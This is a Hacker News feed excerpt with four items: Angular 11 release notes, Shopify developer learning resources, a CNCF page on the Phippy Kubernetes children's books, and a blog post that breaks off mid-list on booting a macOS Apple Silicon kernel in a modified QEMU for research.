provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068668</guid>
            <pubDate>Thu, 12 Nov 2020 11:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Shopify Developer – Resources to Become a Shopify Dev]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25067407">thread link</a>) | @iliashad
<br/>
November 11, 2020 | https://iliashaddad.com/blog/how-to-become-shopify-developer | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-become-shopify-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="how to become shopify developer 0" title="how to become shopify developer 0" src="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg" srcset="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/bce2d/how-to-become-shopify-developer-0.jpg 250w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/953fe/how-to-become-shopify-developer-0.jpg 500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg 1000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/e3932/how-to-become-shopify-developer-0.jpg 1500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/451a4/how-to-become-shopify-developer-0.jpg 2000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Shopify has been growing so fast in the last couple of years. “We made history in 2018: no other SaaS company has crossed the $1 billion-dollar revenue mark at a faster growth rate than Shopify has,” said <a href="https://investors.shopify.com/Investor-News-Details/2019/Shopify-Announces-Fourth-Quarter-and-Full-Year-2018-Financial-Results/default.aspx">Tobi Lütke</a></p><p>I’m a self-taught developer who worked as a freelancer and indie maker in 2019 and I learned Shopify app and theme development and I want to share with you resources that help me to become a Shopify developer</p><h3><strong>Prerequisite to learn Shopify Theme Development&nbsp;:</strong></h3><p>Shopify theme is like WordPress themes but Shopify use their markup language (Liquid ) instead of PHP</p><p>You need to</p><ul><li>have basic knowledge with HTML5, CSS3, and JavaScript</li><li>have basic knowledge with jQuey (Many Shopify libraries use jQuery ) — Optional</li><li>have basic knowledge with Command Line</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to upload and test your Shopify theme (Free with unlimited Shopify store for development)</li></ul><h3>Prerequisite to learn Shopify App Development&nbsp;:</h3><p>Shopify app is a web app and you can use any programming language like Ruby, Python, PHP or Node JS to build one and in this guide, I’ll focus on Node JS in this guide</p><p>You need to&nbsp;:</p><ul><li>have basic knowledge with HTML5, CSS3</li><li>a good understanding of JavaScript and React (Shopify Polaris built With React but you can use any framework or just vanilla JS)</li><li>good understanding of how to build a full-stack web application (Authentication, consume external API, Send Requests from the front end and deal with it in the back end )</li><li>have basic knowledge with GraphQL (Shopify API built with GraphQL)</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to create, test and publish your Shopify app (Free)</li></ul><h3>Ressources to learn Shopify Theme Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://www.skillshare.com/classes/Shopify-Essentials-for-Web-Developers-From-Store-Setup-to-Custom-Themes/1070001866/projects">Shopify for web dev</a>elopers: (Free course) Set up your first Shopify store and create your first custom Shopify theme by a Shopify Expert</li><li><a href="https://www.skillshare.com/classes/Advanced-Shopify-Theme-Development/708093439?utm_campaign=video-embed-708093439&amp;utm_source=Video&amp;utm_medium=video-embed">Advanced Shopify</a> Theme: (Free course) Create advanced Shopify theme (Make Shopify theme a single web app using AJAX ) by a Shopify expert</li><li><a href="https://www.shopify.co.uk/partners/shopify-cheat-sheet">Liquid Cheatsheet</a>: Cheatsheet to get all Shopify liquid variables, filters, and helpers</li><li><a href="https://shopify.github.io/liquid-code-examples/">Liquid Code Examples:</a> Collection of code snippets to speed up your development process and understand how to write liquid code</li><li><a href="https://www.youtube.com/playlist?list=PLXQCP3o-w1Pvras8iuflJKO3tfkBT8c0c">Shopify YB Playlist:</a> Youtube course to learn Shopify theme development</li><li><a href="https://shopify.github.io/themekit/">Shopify Theme Kit</a>: a command-line tool to upload your Shopify theme to a Shopify store automatically when changes are made locally</li><li><a href="https://help.shopify.com/en/themes/development">Shopify Theme Docs</a>: Shopify docs to create your Shopify theme</li></ul><h3>Ressources to learn Shopify App Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://developers.shopify.com/tutorials/build-a-shopify-app-with-node-and-react/set-up-your-app">Shopify React Node App</a>: Tutorial by Shopify team to create your first React and Node JS Shopify app using Polaris (Shopify React design system) and KOA Js to handle server-side rendering</li><li><a href="https://github.com/Shopify/shopify-app-cli">Shopify App CLI:</a> Create your Shopify app like (Create React App), serve your shopify app in Ngrok server (Free) and update your Ngrok server link automatically in your Shopify App dashboard</li></ul><h3>Conclusion</h3><p>Thanks for reading, I wish you the best on your new journey.</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-become-shopify-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067407</guid>
            <pubDate>Thu, 12 Nov 2020 07:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Children's Guide to Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065144">thread link</a>) | @tomasreimers
<br/>
November 11, 2020 | https://www.cncf.io/phippy/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/phippy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
<div><figure><img loading="lazy" width="472" height="487" src="https://www.cncf.io/wp-content/uploads/2020/07/phippy-01-1.svg" alt=""></figure><p><strong>Phippy</strong>&nbsp;is a simple PHP app, trying to find a home in a cloud native world.</p></div>







<div><div>




<h2>Introducing Phippy and friends</h2>












</div></div>







<div>
<div>
<figure><img loading="lazy" width="849" height="651" src="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg 849w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-300x230.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-768x589.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-261x200.jpg 261w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-700x537.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-222x170.jpg 222w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-352x270.jpg 352w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-443x340.jpg 443w" sizes="(max-width: 849px) 100vw, 849px"></figure>




</div>



<div>
<h3>The Illustrated Children’s Guide to Kubernetes</h3>



<p><em>The Illustrated Children’s Guide to Kubernetes</em> is a simple, gentle answer a father gave his daughter when she inquisitively asked about Kubernetes. It’s dedicated to all the parents who try to explain software engineering to their children.</p>



<p>The star of <em>The Illustrated Children’s Guide to Kubernetes</em>, Phippy and her friends explain the core concepts of Kubernetes in simple terms.</p>




</div>
</div>







<div>
<div>
<h3>Phippy Goes to the Zoo</h3>



<p>Follow the tale of Phippy and her niece Zee as they take an educational trip to the Kubernetes Zoo.</p>








</div>



<div>
<figure><img loading="lazy" width="851" height="655" src="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg 851w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-300x231.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-768x591.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-260x200.jpg 260w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-700x539.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-221x170.jpg 221w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-351x270.jpg 351w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-442x340.jpg 442w" sizes="(max-width: 851px) 100vw, 851px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy and Zee go to the Mountains</h3>



<p>Another work featuring Phippy and friends: Join Phippy and Zee on a 4-dimensional hike!</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="768" src="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-300x225.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-768x576.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-267x200.jpg 267w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-700x525.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-227x170.jpg 227w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-360x270.jpg 360w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-453x340.jpg 453w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy In Space: Adventures in Cloud-Native Recovery</h3>



<p>In the not-so-distant future, space outposts (cloud-native infrastructure) are the next frontier for settlement and Captain Kube is in charge of the cutting-edge Mars outpost. As the outpost has grown in size and complexity, Captain Kube needs to find solutions for many of the settlement’s growing pains. He has recruited Phippy to work with him on the outpost’s Day 2 challenges.</p>



<p>Join them on their adventure, as they journey to Mars and brainstorm solutions.</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="792" src="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-300x232.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-768x594.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1536x1187.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-259x200.jpg 259w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-700x541.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-220x170.jpg 220w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-349x270.jpg 349w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-440x340.jpg 440w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space.jpg 1568w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>















<p>The characters Phippy, Captain Kube, Goldie, and Zee and the two books are owned by The Linux Foundation, on behalf of the Cloud Native Computing Foundation, and licensed under the Creative Commons Attribution License (<a href="https://creativecommons.org/licenses/by/4.0/">CC-BY</a>), which means that you can remix, transform, and build upon the material for any purpose, even commercially. If you use the characters, please include the text “<a href="https://phippy.io/">phippy.io</a>” to provide attribution (and online, please include a link to&nbsp;<a href="https://phippy.io/">https://phippy.io</a>).</p>



<p>The characters and the two books were created by&nbsp;<a href="https://twitter.com/technosophos">Matt Butcher</a>,&nbsp;<a href="https://twitter.com/karenhchu">Karen Chu</a>, and&nbsp;<a href="https://www.baileyjeanstudio.com/">Bailey Beougher</a>&nbsp;and donated by Microsoft to CNCF. Goldie is based on the Go Gopher, created by&nbsp;<a href="https://blog.golang.org/gopher">Renee French</a>, which is also licensed under&nbsp;<a href="https://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noreferrer noopener">CC-BY</a>.</p>



<p>Images of Phippy, Captain Kube, Goldie, and Zee are available in the CNCF&nbsp;<a href="https://github.com/cncf/artwork/blob/master/examples/other.md#phippy--friends-group-logos">artwork</a>&nbsp;repo in svg and png formats and in color, black, and white.</p>
	</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/phippy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065144</guid>
            <pubDate>Thu, 12 Nov 2020 01:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Booting a macOS Apple Silicon Kernel in QEMU]]>
            </title>
            <description>
<![CDATA[
Score 257 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25064593">thread link</a>) | @empyrical
<br/>
November 11, 2020 | https://worthdoingbadly.com/xnuqemu3/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/xnuqemu3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I booted the arm64e kernel of macOS 11.0.1 beta 1 kernel in QEMU up to launchd. It’s completely useless, but may be interesting if you’re wondering how an Apple Silicon Mac will boot.</p>

<h2 id="howto">Howto</h2>

<p>This is similar to my previous guide on running <a href="https://worthdoingbadly.com/xnuqemu2/">iOS kernel in QEMU</a>:</p>

<ul>
  <li>install macOS 11.0.1 beta 1 (20B5012D)</li>
  <li>run <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh"><code>build_arm64e_kcache.sh</code></a> to create an Apple Silicon Boot Kext Collection</li>
  <li>build the modified QEMU:
    <div><div><pre><code>git clone https://github.com/zhuowei/qemu
cd qemu
git checkout a12z-macos
mkdir build
cd build
../configure --target-list=aarch64-softmmu
make
</code></pre></div>    </div>
  </li>
  <li>create a modified device tree by running <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">DTRewriter</a> on <a href="https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-30235/6D8C0CA3-5952-4FD8-AEB3-4B4CADB626BC/iPad8,11,iPad8,12_14.0_18A5332f_Restore.ipsw">iPad Pro firmware</a>:
    <div><div><pre><code>python3 extractfilefromim4p.py Firmware/all_flash/DeviceTree.j421ap.im4p DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree
java DTRewriter DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb
</code></pre></div>    </div>
  </li>
  <li>run QEMU:
    <div><div><pre><code>./aarch64-softmmu/qemu-system-aarch64 -M virt -cpu max \
  -kernel /path/to/bootcache-arm64e \
  -dtb /path/to/DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb  \
  -monitor stdio -m 6G -s -S -d unimp,mmu \
  -serial file:/dev/stdout -serial file:/dev/stdout -serial file:/dev/stdout \
  -append "-noprogress cs_enforcement_disable=1 amfi_get_out_of_my_way=1 nvram-log=1 debug=0x8 kextlog=0xffff io=0xfff serial=0x7 cpus=1 rd=md0 apcie=0xffffffff" \
  -initrd /path/to/ios14.0b3/ramdisk.dmg $@
</code></pre></div>    </div>
  </li>
  <li>run gdb with <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/bootit.gdbscript">this script</a>:
    <div><div><pre><code>~/Library/Android/sdk/ndk/21.0.6113669/prebuilt/darwin-x86_64/bin/gdb \
-D /any/emptydir \
-x bootit.gdbscript
</code></pre></div>    </div>
    
  </li>
</ul>

<p>And the macOS kernel will <a href="https://gist.github.com/zhuowei/5aa668e76f387374cd56848313aa2197">boot into launchd</a>.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p><img src="https://worthdoingbadly.com/assets/blog/xnuqemu3/wwdc2018_no.jpg" alt="&quot;No.&quot; - Craig Federighi, WWDC 2018"></p>

<p>No:</p>

<ul>
  <li>Absolutely nothing is supported: literally only the kernel and the serial port works, not even the userspace since there’s no disk driver</li>
  <li>Userspace is instead borrowed from iOS 14 b3</li>
  <li>This will never boot anything close to graphical macOS UI</li>
  <li>Most importantly, even if I ever managed to fully boot the macOS kernel, emulating macOS is useless anyways.</li>
</ul>

<p>There are only three reasons I can think of for emulating macOS: security research, software development without a real Apple Silicon machine, and Hackintoshing. This approach will help with none of these:</p>

<ul>
  <li>Emulating iOS is useful for security research when jailbreak is not available. Apple Silicon Macs already support kernel debugging.</li>
  <li>Not useful for software dev: QEMU’s CPU emulation doesn’t support Apple Silicon-specific features, such as Rosetta’s memory ordering or the APRR JIT.</li>
  <li>as for Hackintosh: macOS uses CPU instructions that aren’t available yet on non-Apple ARM CPUs, so you can’t have hardware accelerated virtualization, only very slow emulation. Besides, Hackintoshes are often built when Apple’s own hardware isn’t fast enough; in this case, Apple’s ARM processors are already some of the fastest in the industry.</li>
</ul>

<p>I researched this this not because it’ll be practical, but only to understand how an Apple Silicon Mac works. This will never be a <a href="https://www.youtube.com/watch?v=1AtE54HpXBM">Time Train</a>: only a <a href="https://youtu.be/UswpJh6Zvd8?t=119">science experiment</a>.</p>

<h2 id="what-i-did">What I did</h2>

<h2 id="create-kext-collection">Create kext collection</h2>

<p>On iOS, the kernel and its Kexts are packed together into a bootable file called the <strong>Kernel Cache</strong>.</p>

<p>macOS 11 uses an evolved version of this format, called the <strong>Boot Kext Collection</strong>.</p>

<p>Like the iOS kernelcache, it contains all Kexts required for booting, so the bootloader only needs to load it into memory and jump into it.</p>

<p>To create a boot kext collection, macOS 11 introduces the <a href="https://developer.apple.com/documentation/kernel/installing_a_custom_kernel_extension?language=objc"><code>kmutil</code></a> tool.</p>

<p>Here’s <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh">my script</a> to get <code>kmutil</code> to generate an arm64e kext collection.</p>

<p>It manually excludes some kexts because they cause kmutil to error out. Most are because they depend on ACPI, which is not available on Apple Silicon. I made a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/printexcludekexts.sh">script</a> to detect them.</p>

<p>Debugging <code>kmutil</code> failures on macOS 11 beta 3 was easy because it dumped out the entire NSError message. However, on macOS 11.0.1 beta, Apple decided to hide the full error message and only print an error code. I had to disable SIP and put a breakpoint on <code>swift_errorRetain</code> to get at the underlying error.</p>

<p>Once the <code>build_arm64e_kcache.sh</code> runs, a Boot Kext Collection is created at <code>~/kcache_out/bootcache-arm64e</code>, which can be booted in QEMU.</p>

<h2 id="disassembling-the-boot-kext-collection">Disassembling the boot kext collection</h2>

<p>For debugging, I also had to disassemble the newly created Boot Kext Collection in Ghidra.</p>

<p>Unfortunately, Ghidra isn’t updated for macOS 11 and will refuse to load the file, first giving an error about XML DOCTYPE, then - once that’s worked around - an <a href="https://github.com/NationalSecurityAgency/ghidra/issues/2192">IOException</a> from the invalid <code>ntools</code> value in the <code>LC_BUILD_VERSION</code> load command.</p>

<p>I created a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/patch_boot_kext_collection_for_ghidra.py">script</a> to fix up the kext collection so that Ghidra can load it.</p>

<p>Note that this is still not perfect - Ghidra still doesn’t fixup pointers or read symbols.</p>

<p>To get method names, I also disassembled the raw kernel file (<code>/System/Library/Kernels/kernel.release.t8020</code>) for cross reference. Note that the raw kernel is based at a different address - you can either rebase it in Ghidra, or just be careful to convert addresses.</p>

<h2 id="disable-pac">Disable PAC</h2>

<p>I already had a <a href="https://worthdoingbadly.com/xnuqemu2/">modified QEMU to boot an iOS kernel</a> (which has inspired others, such as <a href="https://alephsecurity.com/">Aleph Security</a>, to build much better open-source iOS emulation platforms)</p>

<p>In early 2019 I updated my modified QEMU to work with PAC for the iPhone Xs/Xr.</p>

<p>QEMU by that time already supported PAC instructions; however, Apple <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">modified</a> the crypto algorithm when implementing PAC, so the kernel fails to boot.</p>

<p>I decided to instead <a href="https://github.com/zhuowei/qemu/commit/16613b67ad15a902791109077ebfb1091f1873aa">turn PAC instructions</a> into no-ops, since I don’t know how Apple’s algorithm worked. This also makes it easier to debug the kernel.</p>

<p>Since the macOS DTK used an A12z processor, the modified QEMU just worked.</p>

<h2 id="device-tree">Device tree</h2>

<p>Like iOS, macOS on Apple Silicon uses a <strong>device tree</strong> to describe hardware to the kernel, and to pass boot arguments.</p>

<p>macOS 11.0.1 beta’s installer doesn’t contain a device tree for the DTK: I suspect it would be in the .ipsw files, which are not publically available. Instead, I borrowed the iPad Pro’s device tree from iOS 14 beta 3.</p>

<p>Like the <a href="https://worthdoingbadly.com/xnuqemu2/">iOS in QEMU experiments</a>, I first disabled every piece of hardware in the device tree except the serial port.</p>

<p>Unlike iOS, macOS expects some more information in the device tree:</p>
<ul>
  <li>ram size (since Macs have upgradeable RAM)</li>
  <li>nvram, otherwise panics with a null pointer while reading nonce-seed. (I copied nvram from <a href="https://gist.github.com/bazad/1faef1a6fe396b820a43170b43e38be1">bazad’s dump of an iPhone device tree</a>.)</li>
  <li>AMCC (KTRR) register positions</li>
  <li>System Integrity Protection status</li>
</ul>

<p>I rewrote my <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">device tree editor</a> to allow populating these extra params.</p>

<h2 id="up-to-launchd">Up to launchd</h2>

<p>I can’t actually boot a macOS root filesystem as I don’t have an emulated hard disk.</p>

<p>I don’t have a recovery ramdisk either: that would likely only be included in the DTK IPSW, which is not public.</p>

<p>Instead, I decided to boot with an iOS ramdisk to test the kernel, and disable signature checking using a GDB breakpoint.</p>

<p>I also couldn’t get the trustcache (list of executables trusted by the kernel) to load. I tried following <a href="https://alephsecurity.com/2019/06/25/xnu-qemu-arm64-2/">Aleph Security’s guide</a>, but macOS 11 is more strict than iOS 12 and needs it below the kernel; I couldn’t figure out the correct memory address.</p>

<h2 id="why-it-took-so-long">Why it took so long</h2>

<p>I actually had this blog post ready since <a href="https://gist.github.com/zhuowei/27816d39f234468cf2956479c0dea7ad">August 9th</a>, but I spent an extra 3 months trying to fix issues, since I really wanted to at least get to a shell!</p>

<p>Unfortunately:</p>
<ul>
  <li>debugging why drivers wasn’t loading was hard</li>
  <li>I couldn’t disable signature checking properly</li>
  <li>I wanted to wait until Apple released an A14 kernel instead of the DTK’s A12, so that we can look at how virtualization works, but they never did</li>
</ul>

<p>It’s now November 9th and Apple’s holding their press conference tomorrow: so it’s <a href="https://www.youtube.com/watch?v=9tAbhrDUrqM">now or never</a>.</p>

<h2 id="whats-left">What’s left</h2>

<p>I’m probably not going to be working further on this, but here’s what one can do to make this an actual useful research platform:</p>

<ul>
  <li>Figure out why half the drivers aren’t loading at all</li>
  <li>Write basic drivers/emulations:
    <ul>
      <li>probably emulate AIC in QEMU (based on Project Sandcastle’s Linux driver) since a custom interrupt controller Kext would be hard to write</li>
